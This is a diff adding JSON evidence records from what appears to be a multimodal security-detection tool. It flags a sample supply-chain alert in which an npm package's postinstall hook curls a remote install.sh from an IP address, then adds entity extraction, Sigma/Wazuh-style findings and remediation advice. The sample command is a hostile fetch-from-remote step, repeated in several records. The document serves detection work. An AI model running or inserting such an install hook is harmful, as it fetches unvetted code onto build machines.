+            "sigma-style",
+            "wazuh.severity.critical"
+          ],
+          "first_seen": "2026-06-03T07:57:48.494449+00:00",
+          "fingerprint": "multimodal-finding:3defa11019f67584"
+        },
+        {
+          "id": "MMF-005E22E3CC9D6322",
+          "rule_id": "multimodal-sensitive-interface-anomaly",
+          "title": "语音或截图中出现敏感接口异常访问",
+          "severity": "high",
+          "score": 84,
+          "evidence_id": "MME-20260603075748475445-D40CCA7A",
+          "source_type": "image",
+          "source_name": "manual-ocr-screenshot.txt",
+          "evidence_type": "visual_ocr",
+          "matched_keywords": [
+            "admin/export"
+          ],
+          "entities": [
+            {
+              "type": "api_path",
+              "value": "admin/export",
+              "normalized": "admin/export",
+              "start": 117,
+              "end": 129,
+              "confidence": 0.88,
+              "source": "regex",
+              "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+            }
+          ],
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.819,
+          "recommendation": "将识别到的接口路径与 Web/WAF 日志同时间窗比对，必要时临时关闭导出接口或提高鉴权策略。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.collection",
+            "attack.exfiltration",
+            "multimodal.asr",
+            "sigma-style"
+          ],
+          "first_seen": "2026-06-03T07:57:48.494449+00:00",
+          "fingerprint": "multimodal-finding:005e22e3cc9d6322"
+        }
+      ],
+      "risk_score": 96,
+      "risk_level": "critical"
+    },
+    {
+      "evidence_id": "MME-20260603075744148911-D40CCA7A",
+      "filename": "MME-20260603075744148911-D40CCA7A-video-manual-ocr-screenshot.txt",
+      "original_filename": "manual-ocr-screenshot.txt",
+      "file_path": "C:\\Users\\86189\\Desktop\\sysml2\\storage\\multimodal\\MME-20260603075744148911-D40CCA7A-video-manual-ocr-screenshot.txt",
+      "relative_path": "storage/multimodal/MME-20260603075744148911-D40CCA7A-video-manual-ocr-screenshot.txt",
+      "source_type": "video",
+      "mime_type": "text/plain",
+      "size_bytes": 182,
+      "sha256": "d40cca7a4fd35d3c06bc808cf79a6e860114f915625852131347b0affd3a3e5a",
+      "uploaded_at": "2026-06-03T07:57:44.170911+00:00",
+      "metadata": {
+        "recognized_text_only": true
+      },
+      "derived": [],
+      "recognitions": [
+        {
+          "source_type": "video",
+          "recognized_text": "npm install @acme/payments-helper@9.9.2\npostinstall: curl http://185.199.108.153/install.sh\n凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.92,
+          "evidence_type": "visual_ocr",
+          "engine": "manual-asr-ocr-text",
+          "source_path": "storage/multimodal/MME-20260603075744148911-D40CCA7A-video-manual-ocr-screenshot.txt",
+          "language": "zh-CN",
+          "created_at": "2026-06-03T07:57:44.152908+00:00",
+          "segments": [
+            {
+              "text": "npm install @acme/payments-helper@9.9.2\npostinstall: curl http://185.199.108.153/install.sh\n凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+              "confidence": 0.92
+            }
+          ]
+        }
+      ],
+      "entities": [
+        {
+          "type": "package",
+          "value": "@acme/payments-helper@9.9.2",
+          "normalized": "@acme/payments-helper@9.9.2",
+          "start": 12,
+          "end": 39,
+          "confidence": 0.95,
+          "source": "regex",
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/instal"
+        },
+        {
+          "type": "action",
+          "value": "postinstall",
+          "normalized": "postinstall",
+          "start": 40,
+          "end": 51,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 ch"
+        },
+        {
+          "type": "action",
+          "value": "curl",
+          "normalized": "curl",
+          "start": 53,
+          "end": 57,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "nstall @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout"
+        },
+        {
+          "type": "ip",
+          "value": "185.199.108.153",
+          "normalized": "185.199.108.153",
+          "start": 65,
+          "end": 80,
+          "confidence": 0.96,
+          "source": "regex",
+          "evidence": "/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/expor"
+        },
+        {
+          "type": "time",
+          "value": "凌晨三点",
+          "normalized": "凌晨三点",
+          "start": 92,
+          "end": 96,
+          "confidence": 0.78,
+          "source": "regex",
+          "evidence": "install: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "service",
+          "value": "checkout-api",
+          "normalized": "checkout-api",
+          "start": 97,
+          "end": 109,
+          "confidence": 0.82,
+          "source": "regex",
+          "evidence": "ll: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "异常外联",
+          "normalized": "异常外联",
+          "start": 112,
+          "end": 116,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "/185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "外联",
+          "normalized": "外联",
+          "start": 114,
+          "end": 116,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "85.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 117,
+          "end": 129,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "api_path",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 117,
+          "end": 129,
+          "confidence": 0.88,
+          "source": "regex",
+          "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        }
+      ],
+      "findings": [
+        {
+          "id": "MMF-5AFEB0DCB0C845B6",
+          "rule_id": "multimodal-postinstall-egress",
+          "title": "截图或语音中出现安装脚本外联",
+          "severity": "critical",
+          "score": 96,
+          "evidence_id": "MME-20260603075744148911-D40CCA7A",
+          "source_type": "video",
+          "source_name": "manual-ocr-screenshot.txt",
+          "evidence_type": "visual_ocr",
+          "matched_keywords": [
+            "postinstall",
+            "curl"
+          ],
+          "entities": [
+            {
+              "type": "ip",
+              "value": "185.199.108.153",
+              "normalized": "185.199.108.153",
+              "start": 65,
+              "end": 80,
+              "confidence": 0.96,
+              "source": "regex",
+              "evidence": "/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/expor"
+            }
+          ],
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.881,
+          "recommendation": "立即隔离相关依赖包和构建产物，固定私有源解析，封禁外联目标，并使用可信 runner 重新构建。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://github.com/SigmaHQ/sigma",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.supply_chain",
+            "attack.execution",
+            "multimodal.ocr",
+            "sigma-style",
+            "wazuh.severity.critical"
+          ],
+          "first_seen": "2026-06-03T07:57:44.168911+00:00",
+          "fingerprint": "multimodal-finding:5afeb0dcb0c845b6"
+        },
+        {
+          "id": "MMF-78913E6F06230313",
+          "rule_id": "multimodal-sensitive-interface-anomaly",
+          "title": "语音或截图中出现敏感接口异常访问",
+          "severity": "high",
+          "score": 84,
+          "evidence_id": "MME-20260603075744148911-D40CCA7A",
+          "source_type": "video",
+          "source_name": "manual-ocr-screenshot.txt",
+          "evidence_type": "visual_ocr",
+          "matched_keywords": [
+            "admin/export"
+          ],
+          "entities": [
+            {
+              "type": "api_path",
+              "value": "admin/export",
+              "normalized": "admin/export",
+              "start": 117,
+              "end": 129,
+              "confidence": 0.88,
+              "source": "regex",
+              "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+            }
+          ],
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.819,
+          "recommendation": "将识别到的接口路径与 Web/WAF 日志同时间窗比对，必要时临时关闭导出接口或提高鉴权策略。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.collection",
+            "attack.exfiltration",
+            "multimodal.asr",
+            "sigma-style"
+          ],
+          "first_seen": "2026-06-03T07:57:44.168911+00:00",
+          "fingerprint": "multimodal-finding:78913e6f06230313"
+        }
+      ],
+      "risk_score": 96,
+      "risk_level": "critical"
+    },
+    {
+      "evidence_id": "MME-20260603075737188756-D40CCA7A",
+      "filename": "MME-20260603075737188756-D40CCA7A-audio-manual-asr-alert.txt",
+      "original_filename": "manual-asr-alert.txt",
+      "file_path": "C:\\Users\\86189\\Desktop\\sysml2\\storage\\multimodal\\MME-20260603075737188756-D40CCA7A-audio-manual-asr-alert.txt",
+      "relative_path": "storage/multimodal/MME-20260603075737188756-D40CCA7A-audio-manual-asr-alert.txt",
+      "source_type": "audio",
+      "mime_type": "text/plain",
+      "size_bytes": 182,
+      "sha256": "d40cca7a4fd35d3c06bc808cf79a6e860114f915625852131347b0affd3a3e5a",
+      "uploaded_at": "2026-06-03T07:57:37.207751+00:00",
+      "metadata": {
+        "recognized_text_only": true
+      },
+      "derived": [],
+      "recognitions": [
+        {
+          "source_type": "audio",
+          "recognized_text": "npm install @acme/payments-helper@9.9.2\npostinstall: curl http://185.199.108.153/install.sh\n凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.92,
+          "evidence_type": "audio_asr",
+          "engine": "manual-asr-ocr-text",
+          "source_path": "storage/multimodal/MME-20260603075737188756-D40CCA7A-audio-manual-asr-alert.txt",
+          "language": "zh-CN",
+          "created_at": "2026-06-03T07:57:37.192752+00:00",
+          "segments": [
+            {
+              "text": "npm install @acme/payments-helper@9.9.2\npostinstall: curl http://185.199.108.153/install.sh\n凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+              "confidence": 0.92
+            }
+          ]
+        }
+      ],
+      "entities": [
+        {
+          "type": "package",
+          "value": "@acme/payments-helper@9.9.2",
+          "normalized": "@acme/payments-helper@9.9.2",
+          "start": 12,
+          "end": 39,
+          "confidence": 0.95,
+          "source": "regex",
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/instal"
+        },
+        {
+          "type": "action",
+          "value": "postinstall",
+          "normalized": "postinstall",
+          "start": 40,
+          "end": 51,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 ch"
+        },
+        {
+          "type": "action",
+          "value": "curl",
+          "normalized": "curl",
+          "start": 53,
+          "end": 57,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "nstall @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout"
+        },
+        {
+          "type": "ip",
+          "value": "185.199.108.153",
+          "normalized": "185.199.108.153",
+          "start": 65,
+          "end": 80,
+          "confidence": 0.96,
+          "source": "regex",
+          "evidence": "/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/expor"
+        },
+        {
+          "type": "time",
+          "value": "凌晨三点",
+          "normalized": "凌晨三点",
+          "start": 92,
+          "end": 96,
+          "confidence": 0.78,
+          "source": "regex",
+          "evidence": "install: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "service",
+          "value": "checkout-api",
+          "normalized": "checkout-api",
+          "start": 97,
+          "end": 109,
+          "confidence": 0.82,
+          "source": "regex",
+          "evidence": "ll: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "异常外联",
+          "normalized": "异常外联",
+          "start": 112,
+          "end": 116,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "/185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "外联",
+          "normalized": "外联",
+          "start": 114,
+          "end": 116,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "85.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 117,
+          "end": 129,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "api_path",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 117,
+          "end": 129,
+          "confidence": 0.88,
+          "source": "regex",
+          "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        }
+      ],
+      "findings": [
+        {
+          "id": "MMF-5C292C415318F931",
+          "rule_id": "multimodal-postinstall-egress",
+          "title": "截图或语音中出现安装脚本外联",
+          "severity": "critical",
+          "score": 96,
+          "evidence_id": "MME-20260603075737188756-D40CCA7A",
+          "source_type": "audio",
+          "source_name": "manual-asr-alert.txt",
+          "evidence_type": "audio_asr",
+          "matched_keywords": [
+            "postinstall",
+            "curl"
+          ],
+          "entities": [
+            {
+              "type": "ip",
+              "value": "185.199.108.153",
+              "normalized": "185.199.108.153",
+              "start": 65,
+              "end": 80,
+              "confidence": 0.96,
+              "source": "regex",
+              "evidence": "/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/expor"
+            }
+          ],
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.881,
+          "recommendation": "立即隔离相关依赖包和构建产物，固定私有源解析，封禁外联目标，并使用可信 runner 重新构建。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://github.com/SigmaHQ/sigma",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.supply_chain",
+            "attack.execution",
+            "multimodal.ocr",
+            "sigma-style",
+            "wazuh.severity.critical"
+          ],
+          "first_seen": "2026-06-03T07:57:37.205755+00:00",
+          "fingerprint": "multimodal-finding:5c292c415318f931"
+        },
+        {
+          "id": "MMF-3A867A4A881D015B",
+          "rule_id": "multimodal-sensitive-interface-anomaly",
+          "title": "语音或截图中出现敏感接口异常访问",
+          "severity": "high",
+          "score": 84,
+          "evidence_id": "MME-20260603075737188756-D40CCA7A",
+          "source_type": "audio",
+          "source_name": "manual-asr-alert.txt",
+          "evidence_type": "audio_asr",
+          "matched_keywords": [
+            "admin/export"
+          ],
+          "entities": [
+            {
+              "type": "api_path",
+              "value": "admin/export",
+              "normalized": "admin/export",
+              "start": 117,
+              "end": 129,
+              "confidence": 0.88,
+              "source": "regex",
+              "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+            }
+          ],
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.819,
+          "recommendation": "将识别到的接口路径与 Web/WAF 日志同时间窗比对，必要时临时关闭导出接口或提高鉴权策略。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.collection",
+            "attack.exfiltration",
+            "multimodal.asr",
+            "sigma-style"
+          ],
+          "first_seen": "2026-06-03T07:57:37.205755+00:00",
+          "fingerprint": "multimodal-finding:3a867a4a881d015b"
+        }
+      ],
+      "risk_score": 96,
+      "risk_level": "critical"
+    },
+    {
+      "evidence_id": "MME-20260603075732841030-D40CCA7A",
+      "filename": "MME-20260603075732841030-D40CCA7A-image-manual-ocr-screenshot.txt",
+      "original_filename": "manual-ocr-screenshot.txt",
+      "file_path": "C:\\Users\\86189\\Desktop\\sysml2\\storage\\multimodal\\MME-20260603075732841030-D40CCA7A-image-manual-ocr-screenshot.txt",
+      "relative_path": "storage/multimodal/MME-20260603075732841030-D40CCA7A-image-manual-ocr-screenshot.txt",
+      "source_type": "image",
+      "mime_type": "text/plain",
+      "size_bytes": 182,
+      "sha256": "d40cca7a4fd35d3c06bc808cf79a6e860114f915625852131347b0affd3a3e5a",
+      "uploaded_at": "2026-06-03T07:57:32.862028+00:00",
+      "metadata": {
+        "recognized_text_only": true
+      },
+      "derived": [],
+      "recognitions": [
+        {
+          "source_type": "image",
+          "recognized_text": "npm install @acme/payments-helper@9.9.2\npostinstall: curl http://185.199.108.153/install.sh\n凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.92,
+          "evidence_type": "visual_ocr",
+          "engine": "manual-asr-ocr-text",
+          "source_path": "storage/multimodal/MME-20260603075732841030-D40CCA7A-image-manual-ocr-screenshot.txt",
+          "language": "zh-CN",
+          "created_at": "2026-06-03T07:57:32.846025+00:00",
+          "segments": [
+            {
+              "text": "npm install @acme/payments-helper@9.9.2\npostinstall: curl http://185.199.108.153/install.sh\n凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+              "confidence": 0.92
+            }
+          ]
+        }
+      ],
+      "entities": [
+        {
+          "type": "package",
+          "value": "@acme/payments-helper@9.9.2",
+          "normalized": "@acme/payments-helper@9.9.2",
+          "start": 12,
+          "end": 39,
+          "confidence": 0.95,
+          "source": "regex",
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/instal"
+        },
+        {
+          "type": "action",
+          "value": "postinstall",
+          "normalized": "postinstall",
+          "start": 40,
+          "end": 51,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 ch"
+        },
+        {
+          "type": "action",
+          "value": "curl",
+          "normalized": "curl",
+          "start": 53,
+          "end": 57,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "nstall @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout"
+        },
+        {
+          "type": "ip",
+          "value": "185.199.108.153",
+          "normalized": "185.199.108.153",
+          "start": 65,
+          "end": 80,
+          "confidence": 0.96,
+          "source": "regex",
+          "evidence": "/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/expor"
+        },
+        {
+          "type": "time",
+          "value": "凌晨三点",
+          "normalized": "凌晨三点",
+          "start": 92,
+          "end": 96,
+          "confidence": 0.78,
+          "source": "regex",
+          "evidence": "install: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "service",
+          "value": "checkout-api",
+          "normalized": "checkout-api",
+          "start": 97,
+          "end": 109,
+          "confidence": 0.82,
+          "source": "regex",
+          "evidence": "ll: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "异常外联",
+          "normalized": "异常外联",
+          "start": 112,
+          "end": 116,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "/185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "外联",
+          "normalized": "外联",
+          "start": 114,
+          "end": 116,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "85.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 117,
+          "end": 129,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "api_path",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 117,
+          "end": 129,
+          "confidence": 0.88,
+          "source": "regex",
+          "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        }
+      ],
+      "findings": [
+        {
+          "id": "MMF-E1173316AF46FE47",
+          "rule_id": "multimodal-postinstall-egress",
+          "title": "截图或语音中出现安装脚本外联",
+          "severity": "critical",
+          "score": 96,
+          "evidence_id": "MME-20260603075732841030-D40CCA7A",
+          "source_type": "image",
+          "source_name": "manual-ocr-screenshot.txt",
+          "evidence_type": "visual_ocr",
+          "matched_keywords": [
+            "postinstall",
+            "curl"
+          ],
+          "entities": [
+            {
+              "type": "ip",
+              "value": "185.199.108.153",
+              "normalized": "185.199.108.153",
+              "start": 65,
+              "end": 80,
+              "confidence": 0.96,
+              "source": "regex",
+              "evidence": "/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/expor"
+            }
+          ],
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.881,
+          "recommendation": "立即隔离相关依赖包和构建产物，固定私有源解析，封禁外联目标，并使用可信 runner 重新构建。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://github.com/SigmaHQ/sigma",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.supply_chain",
+            "attack.execution",
+            "multimodal.ocr",
+            "sigma-style",
+            "wazuh.severity.critical"
+          ],
+          "first_seen": "2026-06-03T07:57:32.860025+00:00",
+          "fingerprint": "multimodal-finding:e1173316af46fe47"
+        },
+        {
+          "id": "MMF-1499809F84FBC553",
+          "rule_id": "multimodal-sensitive-interface-anomaly",
+          "title": "语音或截图中出现敏感接口异常访问",
+          "severity": "high",
+          "score": 84,
+          "evidence_id": "MME-20260603075732841030-D40CCA7A",
+          "source_type": "image",
+          "source_name": "manual-ocr-screenshot.txt",
+          "evidence_type": "visual_ocr",
+          "matched_keywords": [
+            "admin/export"
+          ],
+          "entities": [
+            {
+              "type": "api_path",
+              "value": "admin/export",
+              "normalized": "admin/export",
+              "start": 117,
+              "end": 129,
+              "confidence": 0.88,
+              "source": "regex",
+              "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+            }
+          ],
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.819,
+          "recommendation": "将识别到的接口路径与 Web/WAF 日志同时间窗比对，必要时临时关闭导出接口或提高鉴权策略。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.collection",
+            "attack.exfiltration",
+            "multimodal.asr",
+            "sigma-style"
+          ],
+          "first_seen": "2026-06-03T07:57:32.860025+00:00",
+          "fingerprint": "multimodal-finding:1499809f84fbc553"
+        }
+      ],
+      "risk_score": 96,
+      "risk_level": "critical"
+    },
+    {
+      "evidence_id": "MME-20260603075458712842-D40CCA7A",
+      "filename": "MME-20260603075458712842-D40CCA7A-image-manual-ocr-screenshot.txt",
+      "original_filename": "manual-ocr-screenshot.txt",
+      "file_path": "C:\\Users\\86189\\Desktop\\sysml2\\storage\\multimodal\\MME-20260603075458712842-D40CCA7A-image-manual-ocr-screenshot.txt",
+      "relative_path": "storage/multimodal/MME-20260603075458712842-D40CCA7A-image-manual-ocr-screenshot.txt",
+      "source_type": "image",
+      "mime_type": "text/plain",
+      "size_bytes": 182,
+      "sha256": "d40cca7a4fd35d3c06bc808cf79a6e860114f915625852131347b0affd3a3e5a",
+      "uploaded_at": "2026-06-03T07:54:58.732719+00:00",
+      "metadata": {
+        "recognized_text_only": true
+      },
+      "derived": [],
+      "recognitions": [
+        {
+          "source_type": "image",
+          "recognized_text": "npm install @acme/payments-helper@9.9.2\npostinstall: curl http://185.199.108.153/install.sh\n凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.92,
+          "evidence_type": "visual_ocr",
+          "engine": "manual-asr-ocr-text",
+          "source_path": "storage/multimodal/MME-20260603075458712842-D40CCA7A-image-manual-ocr-screenshot.txt",
+          "language": "zh-CN",
+          "created_at": "2026-06-03T07:54:58.717841+00:00",
+          "segments": [
+            {
+              "text": "npm install @acme/payments-helper@9.9.2\npostinstall: curl http://185.199.108.153/install.sh\n凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+              "confidence": 0.92
+            }
+          ]
+        }
+      ],
+      "entities": [
+        {
+          "type": "package",
+          "value": "@acme/payments-helper@9.9.2",
+          "normalized": "@acme/payments-helper@9.9.2",
+          "start": 12,
+          "end": 39,
+          "confidence": 0.95,
+          "source": "regex",
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/instal"
+        },
+        {
+          "type": "action",
+          "value": "postinstall",
+          "normalized": "postinstall",
+          "start": 40,
+          "end": 51,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 ch"
+        },
+        {
+          "type": "action",
+          "value": "curl",
+          "normalized": "curl",
+          "start": 53,
+          "end": 57,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "nstall @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout"
+        },
+        {
+          "type": "ip",
+          "value": "185.199.108.153",
+          "normalized": "185.199.108.153",
+          "start": 65,
+          "end": 80,
+          "confidence": 0.96,
+          "source": "regex",
+          "evidence": "/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/expor"
+        },
+        {
+          "type": "time",
+          "value": "凌晨三点",
+          "normalized": "凌晨三点",
+          "start": 92,
+          "end": 96,
+          "confidence": 0.78,
+          "source": "regex",
+          "evidence": "install: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "service",
+          "value": "checkout-api",
+          "normalized": "checkout-api",
+          "start": 97,
+          "end": 109,
+          "confidence": 0.82,
+          "source": "regex",
+          "evidence": "ll: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "异常外联",
+          "normalized": "异常外联",
+          "start": 112,
+          "end": 116,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "/185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "外联",
+          "normalized": "外联",
+          "start": 114,
+          "end": 116,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "85.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 117,
+          "end": 129,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "api_path",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 117,
+          "end": 129,
+          "confidence": 0.88,
+          "source": "regex",
+          "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        }
+      ],
+      "findings": [
+        {
+          "id": "MMF-6986CDA1FDCF478B",
+          "rule_id": "multimodal-postinstall-egress",
+          "title": "截图或语音中出现安装脚本外联",
+          "severity": "critical",
+          "score": 96,
+          "evidence_id": "MME-20260603075458712842-D40CCA7A",
+          "source_type": "image",
+          "source_name": "manual-ocr-screenshot.txt",
+          "evidence_type": "visual_ocr",
+          "matched_keywords": [
+            "postinstall",
+            "curl"
+          ],
+          "entities": [
+            {
+              "type": "ip",
+              "value": "185.199.108.153",
+              "normalized": "185.199.108.153",
+              "start": 65,
+              "end": 80,
+              "confidence": 0.96,
+              "source": "regex",
+              "evidence": "/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/expor"
+            }
+          ],
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.881,
+          "recommendation": "立即隔离相关依赖包和构建产物，固定私有源解析，封禁外联目标，并使用可信 runner 重新构建。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://github.com/SigmaHQ/sigma",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.supply_chain",
